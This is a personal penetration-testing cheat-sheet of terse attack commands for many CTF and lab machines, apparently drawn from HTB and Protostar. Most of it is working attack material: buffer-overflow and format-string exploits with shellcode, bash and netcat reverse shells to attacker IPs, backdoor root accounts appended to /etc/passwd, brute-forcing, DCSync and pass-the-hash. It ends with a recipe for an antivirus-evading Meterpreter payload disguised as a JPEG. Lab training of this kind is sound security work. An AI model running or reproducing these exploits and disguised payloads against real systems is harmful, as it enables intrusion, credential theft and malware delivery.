echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
http://10.10.10.115:9200/_cat/indices
http://10.10.10.115:9200/_search?q=clave
echo dXNlcjogc2VjdXJpdHkg | base64 -d
echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
ssh security@10.10.10.115
shell.js 
		##LFI kibana 6.4 souce:https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
ss -lnt
ssh -L 9000:localhost:5601 security@10.10.10.115
ssh -R 9000:localhost:5601 root@10.10.14.43 ##another tunnel
shell.js 
		##reverse shell in js
curl -O 10.10.14.43:3434/shell.js
nc -lvp 3434
http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../tmp/shell
http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../dev/shm/shell.js
whereis logstash
cat output.conf
echo “Ejecutar comando : bash -i >& /dev/tcp/10.10.16.161/6666 0>&1” > /opt/kibana/logstash_test
echo “Ejecutar comando : /tmp/nc -e /bin/bash 10.10.14.31 2222” > /opt/kibana/logstash_test
cat /dev/shm/root.sh             
#!/bin/bash
echo 'rooot::0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'Ejecutar comando : sh /dev/shm/root.sh' > /opt/kibana/logstash_pwned
su rooot



Natas
============================================
hexeditor jpg.jpg
FF D8 FF E0
echo exec()
echo system()
passthru()
diff file1 file2


Pinkys Palace V1
===========================================
export {http,https,ftp}_proxy=10.0.2.35:31337
		##change double proxy Burp Project Options -> upstream proxy server
		##dst=*, proxyhost=10.0.2.35, proxy port=31337
gdb ./adminhelper
(gdb) info funtions
msf-pattern_create -l 200
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Aa0Ab1Ab2Ab3
		##copy value in "saved rip ="
msf-pattern_offset -q 0x63413563
python -c "A"*72+"BBBBBB"
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
(gdb) disassemble spawn
(gdb) r $(python -c "print 'A'*72+'\xd0\x47\x55\x55\x55\x55'")
python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\x47\x55\x55\x55\x55'" > output
./adminhelper `cat output`
python -c 'print "A"*268+"BBBB"+"CCCCCCCCCCCCC"'



TMUX
==================================
prefix=ctrl+a
ctrl + r = recursive search
prefix + c = new windows
tmux attach-session -t name
prefix + { = find
	+ ? = search words
	ctrl + space = block
	alt + w = copy to buffer
prefix + [ = edit mode
prefix + ] = paste buffer
prefix + % = half screen beside
prefix + " = half screen under
prefix + z = zoom screen in and out
prefix + } or <space> = change looks
prefix + s or ls = display session
prefix + x = kill unresponsif window




Protostart Format
============================================
./format0 $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")
objdump -t format1 | grep target
for i in {1..200};do echo "trying offset $i - `./format1 DDDD%$i##$08x`"; done | grep DDDD44444444
./format1 $(python -c "print 'AAAA'+'%x.'+'%x'")
./format1 $(python -c "print 'AAAA'+'%x.'*128+'%x'")					##got 414141 value
./format1 $(python -c "print '\x38\x96\x04\x08' + '%x.'*128 + '%n'")	##replacc]e A
python -c "print 'AAAA'+'%x.'*3+'%x'" | ./format2
for i in {1..200};do echo DDDD%$i\$08x > /tmp/temp; echo "trying offset $i - `./format2 < temp`"; done | grep DDDD44444444
python -c "print '\xe4\x96\x04\x08'+'%4\$n'" | ./format2
python -c "print '\xe4\x96\x04\x08'+'A'*60+'%4\$n'" | ./format2
	##target format3 == 0x01025544
(echo -e $(python -c 'print "%08x"')) | ./format3
(echo -e $(python -c 'print "AAAA"+"%08x."*100')) | ./format3
(echo -e $(python -c 'print "AAAA"+"%12$08x."')) | ./format3
let x=0x01025544; echo $x;
(echo -e $(python -c 'print "\xf4\x96\x04\x08"+"%16930112u"+"%12$08n"')) | ./format3
echo -e (python -c "print '\x24\x97\x04\x08JUNK\x25\x97\x04\x08JUNK\x26\x97\x04\x08JUNK\x27\x97\x04\x08'+'%x%x%141x%n%208x%n%128x%n%260x%n'") | ./format4




Protostar Stack 5
============================================
gdb -q stack5
set dissasebly-flavor intel
disas main
(gdb) b* 0x080483da (ret value)
(gdb) r
ABCDEF
(gdb) i r
(gdb) x/s $esp				//(eax value/first value) should be ABCDEF
(gdb) p/d 0xbffff77c - 0xbffff730	//$esp - $eax will be offset value
msf-pattern_create -l 100
msf-pattern_offset -q 0x63413563	##offset value msf
(gdb)r
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
(gdb)x/s 0xbffff77c					##should be "BBBB"
python -c 'print "A"*76+"B"*4+"C"*100'
(gdb) r								##input python ABC
(gdb)x/60s $eax						##return address must be 0xbffff77c+4
									##got 0xbffff780 (0xbffff77c+4) (CCCC... value)
	##the exploit spawn shell
import struct
 
def m32(dir):
    return struct.pack("I",dir)
 
padding="A"*76
ret=m32(0xbffff780)
nops="\x90"*20
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"
 
print padding+ret+nops+shellcode									
								
msfvenom -p linux/x86/exec CMD=/bin/sh -f py	##create shellcode w msfvenom
(python /tmp/exp ;cat) | ./stack5
		##padding+ret_dir+nops+shellcode



Protostar Stack 6
============================================
		##exploit function gets() and no binary Execution
strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
(gdb) set disassembly-flavor intel
(gdb) r
ctrl+c
(gdb) info proc map				##print address location environtment
(gdb) x/s 0xb7e5700 + 0x11f3bf	##address "/bin/sh" (stack6 in libc + string /bin/sh from libc
(gdb) p system					##address system
(gdb) p exit					##address exit
		##exploit ret2libc = padding+system addr +(return/exit/4hexdump)+shell addr
import struct
padding="A"*80
system= struct.pack("I", 0xb7ecff80)
return= "AAAA"
shell=struct.pack("I", 0xb7fb63bf)
print padding+system+return+shell




Protostar Stack 7
============================================
		##exploit return strdup(buffer)
objdump -M intel -d stack7 | grep “call.*eax”
Payload = shellcode + (NOP-(len(shellcode))+eax_addr
echo `python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68##sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*25 + "\xbf\x84\x04\x08")'` | /opt/protostar/bin/stack7


Buffer overflow
============================================
(gdb) disas main
(gdb) break main
objdump -d apps
(gdb) set disassembly-flavor intel
-perm -4000 | grep apps
(gdb) p system
(gdb) p exit
eax = return exec
strcpy() instead of strncpy()
		##EIP = instruction pointer
		##ESP = stack pointer (point to lower memory/top of the stack
		##EBP = base pointer (point to higher memory/bottom of the stack)
$ESP - 300(nopsled)
gcc code1.c -o code1 -save-temps
printenv
ret - $rsp
functions:
gets() ##input after execution
scanf() ##input after eecution
strcpy() ##input argument
sprintf()
strcat()
memcpy()




Silky-CTF
================================================
crunch 7 7 charset.lst mixalpha-numeric-all-space -o asd -t s1lKy@@
cat asd | sort -r > dsa
hydra -l silky -P dsa 10.0.2.37 -t 4 -V ssh
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
scp silky@10.0.2.37:/usr/bin/sky .
string /usr/bin/sky
nano /tmp/whoami
#!/bin/bash
echo 'rooot::0:0:root:/root:/bin/bash' >> /etc/passwd
export PATH=/tmp
./sky



BrainPan 1
===============================================
nmap -sC -sV -A -p- 192.168.56.104
dirb http://192.168.56.104:10000
wget http://192.168.56.104:10000/bin/brainpan.exe
file brainpan.exe
wine brainpan.exe
		##download brainpan.exe open with immunity debugger
msf-pattern-create -l 600
msf-pattern_offset -q 0x76576123
		##find JMP ESP in immunity debugger with right click>search for>command>JMP ESP
objdump -M intel -d brainpan.exe | grep "jmp.*esp"
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.105 LPORT=1234 -f -c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai
pat=A*524
ret= value JMP ESP
nops \x90*10
s.send(pat+ret+nops+shellcode)
		##create handler in metasploit
msfconsole
use exploit/multi/handler
jobs
show payloads
set payload linux/x86/shell/reverse_tcp
set LHOST 192.168.56.105
set LPORT 1234
run
nc -lvp 1234
bash -i
bash -i >& /dev/tcp/192.168.56.105/4321 0>&1
cp /usr/local/bin/validate /home/puck/web/bin
wget http://192.168.56.104:10000/bin/validate
gdb -q validate
msf-pattern_create -l 200
msf-pattern_offset -q 0x9712uqw
objdump -M intel -d validate | grep "call.*eax"
shellcode(28)+nops(116-28)+calleax		##shellcode: http://shell-storm.org/shellcode/files/shellcode-811.php
validate `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("\x41" * 88) + "\xaf\x84\x04\x08"'`
sudo -l
mv anansi_util anansi_util.bck
cp /bin/bash ./anansi_util
sudo -S anansi_util
which ssl
ssl passwd godmode
echo 'rooot:w0cHJ.a5mvNYKk:0:0:root:/root:/bin/bash' >> /etc/passwd






Smash The Tux
=======================================
0x00 strcpy()--------------------------
uname --m
hostnamectl
lsb-release -a
uname --m > cname && hostnamectl >> cname && lsb-release -a >> cname
scp -r /home/user/peda tux@192.168.2.125:/home/tux
(gdb) checksec
msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b \x00'
objdump -M intel -d pwdnme | grep "call.*eax"
print shell+nops(268-len(shell))+eax

0x01 printf()-------------------------
for i in {1..200};do echo "trying offset $i - `echo "DDDD%$i##$08x" | ./pwnme`"; done | grep DDDD44444444

0x02 if(stat)-----------------------------
		##race conditions
		##https://www.win.tue.nl/~aeb/linux/hh/hh-9.html
#!/bin/sh
touch myfile
while true; do
  ln -sf ./myfile a &
  ./pwnme a &
  ln -sf .readthis a &
done
./explout.sh

0x03 strcpy()----------------------------
gdb -q ./pwnme core

0x04 fopen()-----------------------------
ln -s /bin/sh r
PATH=.:$PATH ./pwnme payload

0x05 system()----------------------------
echo 'sh' > ls && chmod +x ls
PATH=.:$PATH ./pwnme

0x06 sprintf()&puts()--------------------
run `python -c 'print "%76xAAAA"'`
p system
run `python -c 'print "%76x\xe0\x43\xe6\xb7"'`
p exit
##find /bin/bash
##rettolibc
%76x+system+exit+/bin/bash

0x07 malloc()&strcpy()-------------------
payload = "sh;#" # The command we want to execute
payload += "A" * 16 # Padding to reach the pointer for the second instances name property
payload += "\x88\x97\x04\x08" # The address for the GOT entry of the strcpy function
payload += " " # End of argument the first
payload += "\xe0\x43\xe6\xb7" # Address of __libc_system - overwriting the GOT entry of the strcpy function
payload += "\x26\x83\x04\x08" # Original address of GOT entry of the malloc function
payload += "\x36\x83\x04\x08" # Original address of the GOT entry of the __gmon_start__ function
payload += "\xb9\x84\x04\x08" # Address of main+94 - overwriting the GOT entry of the exit function





Stack Overflows for Beginners: 1.0.1
=======================================
./levelOne `python -c 'print "A"*100'`
ldd levelTwo | grep libc
sysctl kernel.randomize_va_space
gdb -q ./levelTwo
(gdb) checksec
(gdb) vmmap
(gdb) r `python -c 'print "A"*36+"BBBB"'`
(gdb) p system
(gdb) searchmem /bin/sh
(gdb) searchmem exit
-----------level2--------------
./levelTwo `python -c 'print "A"*36+"\x80\xc9\xe0\xf7"+"BBBB"+"\x08\x70\x55\x56"'`
gdb -q ./levelTwo
(gdb) info functions
(gdb) pd spawn
##find execve@plt execute something maybe shell
./leveltwo `python -c 'print "A"*36+"\xc9\x61\x55\x56"'`
----------level3--------------
gdb -q ./levelThree
(gdb) vmmap
(gdb) r `python -c 'print "A"*268+"BBBB"'`
(gdb) p system
(gdb) searchmem /bin/sh
(gdb) searchmem exit
./levelThree `python -c 'print "A"*268+"\x80\xc9\xe0\xf7"+"BBBB"+"\xaa\xca\xf4\xf7"'`
gdb -q ./levelThree
(gdb) info proc map
objdump -M intel -D /usr/lib32/libc-2.28.so | grep "jmp.*esp"
(gdb) x/s 0xf7dc9000 + 6ff7
-----------level5-------------
pip install pwntools





Sick OS 1.2
==================================================
dirb http://10.1.1.8
nmap --script http-methods --script-args http-methods.url-path='/website' <target>
curl -X OPTIONS http://10.1.1.8/test -v
curl http://10.1.1.8/test --upload-file p0wny.php --http1.0
curl -T p0wny.php http://10.1.1.8/test/ --http1.0
mknod /tmp/pipe1 p
/bin/sh 0</tmp/pipe1 | nc 10.1.1.5 443 1>/tmp/pipe1
nc -lvp 443
curl -T LinEnum.sh http://10.1.1.8/test/ --http1.0
./LinEnum.sh >> linenum.txt
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.1.1.5 LPORT=443 -f raw > msfshell.php
msfconsole
> use exploit/multi/handler
> show payloads
> set payload php/meterpreter/reverse_tcp
> set LHOST 10.1.1.5
> set LPORT 443
> exploit -j
> sysinfo
> upload /root/Desktop/webshells/linexploit.sh
> shell
python -c 'import pty;pty.spawn("/bin/bash")'
		##got cron chkrootkit
chkrootkit -V
searchsploit chkrootkit
echo "#!/bin/bash" > /tmp/update
echo 'echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /tmp/update
chown root:root /bin/sh ; chmod 4777 /bin/sh 		##setuid /bin/sh
su rooot											##pass pass123
/bin/sh



MyHouse 7
==================================
ifconfig enp0s3 up
dhclient -v enp0s3
/bin/bash -c 'bash -i >& /dev/tcp/10.1.1.5/4321 0>&1'
grep -ri "tryharder" /* 2>/dev/null
gzip -d mysql.tar.gz
tar -xvf mysql.tar
hydra -L user.txt -e nsr 10.1.1.9 ssh
scp  mysql.tar.xz admin@10.1.1.9:/tmp
./mysql -h 10.1.1.9 -u root -p
select load_file ("/etc/passwd");
ifconfig | grep inet
./nmap -sT 172.31.30.0/24
ssh -L 444:172.31.30.24:445 admin@10.1.1.9
ssh -L 139:172.31.30.24:139 admin@10.1.1.9
netstat -tauntp
enum4linux 127.0.0.1 | tee enum
smbmap -H 127.0.0.1 -P 444 -u heather -p heather
smbclient \\127.0.0.1\users -U heather -p 444
>dir
>get flag.txt
smbclient \\127.0.0.1/users -U heather -p 444
>get Flag.txt
		##how to conneect smb with file explore
other location > connect to server > smb://127.0.0.1:444/users > input user passwd
7z e moreinfo.7z
for i in $(seq 0 9); do echo {{tryharder:0$i}}; done >> wordlist
for i in $(seq 10 99); do echo $i && 7z e -p{{tryharder:$i}} moreinfo.7z; done >> wordlist
ssh -L 22222:172.31.20.194:24 admin@10.1.1.9
hydra -L user.txt -P pass.txt -s 22222 -e nsr 127.0.0.1 ssh
ssh -p 22222 root@127.0.0.1
grep -ri "tryharder" /* 2>/dev/null




Kioptrix 4
=====================================
Enum4Linux -a 10.1.1.10 | tee enumlinux
nmap --script smb-enum-users -iL 10.1.1.10 -oN nmapsmb
nmap --script smb-vuln* -p 445 10.1.1.10
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
find / -perm -4777 -type f 2>/dev/null | xargs ls -laht
find / -perm -777 -type f 2>/dev/null | xargs ls -laht
locate udf
select * from mysql.func;
select sys_exec('usermod -a -G admin john');
select sys_exec('echo "rooot::0:0:root:/root:/bin/bash');
openssl passwd -1 -salt ignite pass123
mkpasswd -m SHA-512 pass
python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
perl -le 'print crypt("pass123", "abc")'
php -r "print(crypt('aarti','123') . \"\n\");"
ruby -r 'digest' -e 'puts "pass".crypt("$6$salt")'


HackInOS 0.1
===================================
wpcan --url http://localhost:8000 --enumerate u
dirb http://localhost:8000
for i in $(seq 0 101); do echo -n "php-reverse-shell.php$i" | md5sum | cut -d " " -f1; done | tee file
wfuzz -c -w file --hc 404 http://localhost:8000/uploads/FUZZ.php
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
tail -n 100 /etc/passwd > passwd.txt
tail -n 100 /etc/shadow > shadow.txt
unshadow passwd.txt shadow.txt > unshadow.txt
john unshadow.txt
su root




Metasploitable 3 windows
====================================
		##jerskin
tcpdump -ni eth0 icmp
nmap --script vulscan -sV -p 8022 10.1.1.12
nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV -p 8022 10.1.1.12
		##manageengine desktop central 9
searchsploit manage engine desktop 9
>use exploit/windows/http/manageengine_connectionid_write
>set lhost 10.1.1.5
>set rhost 10.1.1.12
>exploit
>sysinfo
>shell
		##wampserver
curl -T p0wny.php http://10.1.1.12:8585/uploads/
		##elasticsearch
http://10.1.1.12:9200/metasploitable3/_search?pretty
curl -X GET http://10.1.1.12:9200/metasploitable3_search" -H 'Content-Type: application/json' -d
PUT http://10.1.1.12:9200/index/_doc/id
{
	"name" : "asd",
	"email" : "asd@asd",
	"address" : {
		"coutry" : "indog"
		"city" : "madman"
		},
	"hobby" : ["eat","shit"]},
}
http://10.1.1.12:9200/index/_doc/id
curl -X DELETE http://10.1.1.12:9200/index/_doc/id
curl -X POST http://10.1.1.12:9200/index/_update/id
{
	"name" : "asd",
}
http://10.1.1.12:9200/_cat/indices?v
http://10.1.1.12:9200/_search/
curl -X GET http://10.1.1.12:9200/index/_search
{
	"query" : {
		"match" : {
			"address.city" : "madman"
		}
	}
}
elasticdump



Forest HTB
===================================
git clone https://github.com/sensepost/UserEnum
./UserEnum_RPC.py 10.10.10.161 userlist.txt
rpcclinet -U"%" 10.10.10.161
rpcclient -U"" -N 10.10.10.161
rpcclinet?> ?
>enumdomusers
>enumdomgroups
	#save user to user.txt
enum4linux -a 10.10.10.161
	#emumerate user without rpcclient
GetNPUsers.py -dc-ip 10.10.10.161 htb
	#find hash without preauth
GetNPUsers.py -usersfile ../forest/userasli.txt -no-pass -dc-ip 10.10.10.161 htb/
hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt --force
gem install evil-winrm
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
upload SharpHound.ps1 c:\temp\SharpHound.ps1
>Import-module ./SharpHound.ps1
>Invoke-BloodHound -CollectionMethod All
>Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUser "svc-alfresco" -LDAPPass "s3rvice"
	#svc-alfresco is part of "account operators group windows" group which can create user
	#https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups
	#abuse group of "account operator" create user
PS>New-ADUser -Name hacker -SamAccountName tai -AccountPassword (ConvertTo-SecureString "tai123!" -AsPlainText -Force) -Enabled $True
>net user tai tai123! /add
	#add to "Exchange Windows Permissions" groups
PS>Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members tai
>net group "Exchange Windows Permissions" /add tai
	#group properties
PS>Get-ADUser -Identity hacker -Properties *
>net group "Exchange Windows Permissions"
	#add user to DCSync
copy \\10.10.14.2\asd\PowerView.ps1
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString "taitai1" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("htb.local\tai", $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tai -Rights DCSync
Start-Process -FilePath "powershell.exe" -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/rev.ps1')" -Credential $mycreds
Start-Process -FilePath "C:\temp\rshell.exe" -Credential $Cred
	#another way to add user to DCSycn
aclpwn -f tai -t htb.local -d htb.local -s 10.10.10.161 -u tai -p taitai1
	#dump hash
impacket/secretsdump.py -just-dc-ntlm HTB/tai:taitai1@10.10.10.161
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
type Users\Administrator\Desktop\root.txt
crackmapexec smb 10.10.10.161 -u Administrator -d htb.local -H 32693b11e6aa90eb43d32c72a07ceea6
crackmapexec winrm 10.10.10.161 -u Administrator -d htb.local -H 32693b11e6aa90eb43d32c72a07ceea6
>whoami
	htb\administrator
	#ps-esec for high integrity shell
impacket-psexec -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb.local/Administrator@10.10.10.161
>whoami
	nt authority\system



RE HTB
===================================
smbmap -H 10.10.10.144 -u 'anonymous' -p ''
smbclient \\reblog.htb\malware_dropbox
>put nmap
>dir
		##create malicious ODS file
msfconsole
use exploit/multi/misc/openoffice_document_macro
show options
set srvhost 10.10.15.59
set srvport 4343
exploit
cp /root/.msf4/local/msf.odt .msf.ods
cp msf.ods msf.ods.zip
unzip msf.ods.zip -d files/
		##create virus
msfconsole
use payload/windows/x64/meterpreter/reverse_tcp
generate -f exe -i 3 -o virus.exe -p windows
zip -r malicious.ods.zip ./*




Player HTB
=====================================
searchsploit openssh 6.6
searchsploit -m 41136
wfuzz -c -f sub-fighter -w /wordlist/seclist/Deiscovery/DNS/subdomains-top1mil-5000.txt -u "http://chaos.htb" -H "Host: FUZZ.chaos.htb" -t 42 --hl 1
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains.txt --hc 400,403,404 -H "Host: FUZZ.player.htb" -u http://player.htb -t 50
	##list avaliable site addresses
	dev.player.htb
	chat.player.htb
	staging.player.htb
	player.htb/launcher/
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
	##got source code how to encrypt
	'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03' ]; 
	$key = '_S0_R@nd0m_P@ss_'; 
	$jwt = JWT
		##jwt.io how to decrypt JWT js, and access again with cookies access="jwt"
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/
		##upload file and download it and play it
file 1438328879.avi
		##https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
python gen_avi_bypass.py file:///etc/passwd passwdavi
python gen_avi_bypass.py file:///var/www/backup/service_config srvconfgavi
		##got credentials telegen:d-bC|jC!2uepS/w
python gen_avi_bypass.py file:///etc/apache2/sites-enabled/000-default.conf apachecnfavi
ssh -o IdentitiesOnly=yes -l telegen 10.10.10.145 -p 6686
searchsploit ssh 7.2
searchsploit -m 39569
python 39569.py
python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'
.readfile /var/www/staging/fix.php
		##got credentials peter:CQXpm\z)G5D#%S$y=
dev.player.htb
		##login and create project under /var/www/demo/ athen upload p0wny.php and access it
dev.player.htb/languages/sr.php
mknod /tmp/pipe1 p
/bin/sh 0</tmp/pipe1 | nc 10.10.14.203 4343 1>/tmp/pipe1
nc -lvp 4343
wget http://10.10.14.203:8888/pspy64
chmod +x pspy64
./pspy64
cp /var/lib/playbuf/buff.php /var/www/html/demo/languages/buff.txt
wget dev.player.htb/languages/buff.txt
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak
		##cant download reverse shell because firewall
cat phpsh.php | base64 -w 0
echo '' >> /tmp/phpsh.b64
base64 -d /tmp/phpsh.b64 > /tmp/phpsh.php
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak
cp /tmp/phpsh.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
nc -lvp 4334
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php






Postman HTB
======================================
curl -ks
ssh-keygen -t rsa -f /root/.ssh/redis_ssh_key -q -N ""
(echo -n "\"\n\n"; cat /root/.ssh/redis_ssh_key.pub; echo -n "\n\n\"")
		##redis RCE https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
telnet 10.10.10.160 6379
>set key "//paste key and \n"
>config set dir /var/lib/redis/.ssh
>config set dbfilename authorized_keys
>save
>quit
ssh -o IdentitiesOnly=yes -l redis -i /root/.ssh/redis_ssh_key 10.10.10.160
find / -name "*.bak" -print -execdir ls -la {} \; 2>/dev/null
cat /opt/id_rsa.bak
python /usr/share/john/ssh2john.py matt_private_key.txt > matt_private_key.hash
		##fix the format
nano matt_private_key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt matt_private_key.hash
su Matt
ls -lah /var/www/
msfconsole
use exploit/linux/http/webmin_packagup_rce
>set rhost 10.10.10.160
>set lhost 10.10.12.120
>set ssl true
>set username Matt
>set password computer2008
>exploit
echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash
ssh rooot@10.10.10.160
		##change format passwd and shadow
		##reference shadow: https://www.cyberciti.biz/faq/understanding-etcshadow-file/
nano /etc/shadow
nano /etc/passwd


AI HTB
====================================
./query_ai.sh "open single quote space union select space username space from users comment database"
./query_ai.sh "open single quote space union select space password space from users comment database"
	user= alexa:H,Sq9t6}a<)?q93_
ssh alexa@10.10.10.163
netstat -tnlp
~C
-L 8080:localhost:8080
-L 8000:localhost:8000
-attach localhost:8000
python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd '/tmp/x.sh' --break-on "java.lang.String.indexOf" 




GitLab HTB
====================================
http://10.10.10.144/robots.txt
http://10.10.10.144/help/bookmarks.html
	##open gitlab login in source, there is javascript bookmark for login in hex
	##decode hex in python or here: http://ddecode.com/hexdecoder/
	##upload file than merge and get shell
	##open snippet and get database creds
sudo -l
cp -r /var/www/html/profile /tmp/.whops/
echo "#!/bin/bash" > .git/hooks/post-merge
echo 'echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd' >> .git/hooks/post-merge
	##merge something on profile to get pull
	##reference post-merge: https://www.liquidlight.co.uk/blog/using-a-post-merge-git-hook-to-clean-up-old-branches/
sudo git pull
cat /etc/passwd
su rooot
	##normal chalenge
ip neigh
time for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
nmap  172.19.0.2-5
php -a
> $connection = new PDO('pgsql:host=localhost;dbname=profiles', 'profiles', 'profiles');
> $result = $connection->query("SELECT * FROM profiles");
> $profiles = $result->fetchAll();
> print_r($profiles);
	##got creds
	clave
    c3NoLXN0cjBuZy1wQHNz==
ssh clave@10.10.10.144
scp clave@10.10.10.144:/home/clave/RemoteConnection.exe .
file RemoteConnection.exe
	##open with immunity debugger
search for > all reference text string > open location "Access Denied"
set location right before it > breakpoint > toggle > run
	##check stings on right bottom
	##got creds
	root
	Qf7]8YSV.wDNF*[7d?j&eD4^
ssh root@10.10.10.144


Create Windows payload Meterpreter
===================================
Install Windows Matasploitable 3 machine
install python from here
	https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
make sure when install python add to PATH
download py2exe
	https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download
create windows python payload in kali:
	msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.2.10 LPORT=443 -f raw -o /var/www/html/mrtp.py
create setup.py in
	from distutils.core import setup
	import py2exe
	setup(
	name = ‘Meter’,
	description = ‘Python-based App’,
	version = ‘1.0’,
	windows=[‘mrtp.py’],
	options = {‘py2exe’: {‘bundle_files’: 1,’packages’:’ctypes’,’includes’: ‘base64,sys,socket,struct,time,code,platform,getpass,shutil’,}},
	zipfile = None,
	)
Budle it in windows metasploitable machine:
	python.exe .\setup.py py2exe
	.\dist\mrtp.exe
Set listener
    msfconsole
    use exploit/multi/handler
    set PAYLOAD python/meterpreter/reverse_tcp
    set LHOST 172.28.128.5
    set LPORT 443
    run
Create custom payload below
	import socket,struct,time
	print ("Running . . .")
	for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('172.28.128.5',443))
                break
        except:
                time.sleep(5)
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(l)
	while len(d)<l:
        d+=s.recv(l-len(d))
	exec(d,{'s':s})
	print ("Pengganti payloadku")
	print ("Ramashok!")
encode with base64
customize mrtp.py with new payload
	import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('base64payload==')))
Budle it in windows metasploitable machine:
	python.exe .\setup.py py2exe
	.\dist\mrtp.exe
Hide file exe in sfx image
add to archive
method best
create SFX archive
advance - SFX options
general
	path to extract: %APPDATA%
	absolute path
setup
	run after extraction:
	apps.exe
	image.jpg
modes
	hideall
update 
	extract and replace file
	overwrite all files
	text and incon create image icn
OK
change name to something.jpg
create listener
open file, session run in background
resource:
https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1
https://stackoverflow.com/questions/41129537/hide-the-console-of-an-exe-file-created-with-pyinstaller/41129758
https://msfn.org/board/topic/146499-winrar-sfx-code-to-copy-files-to-userprofileapplication/



Symfonos 5
====================================
nmap -sC -sV -A -p- 10.1.1.127 -o nmapfull
dirb http://10.1.1.27 -X .php,.html
	home.php
	admin.php
	logout.php
10.1.1.27/home.php
10.1.1.27/home.php?url=http://127.0.0.1/potraits.php
10.1.1.27/home.php?url=/etc/passwd
10.1.1.27/home.php?url=admin.php'
	##got credentials
	$bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD")
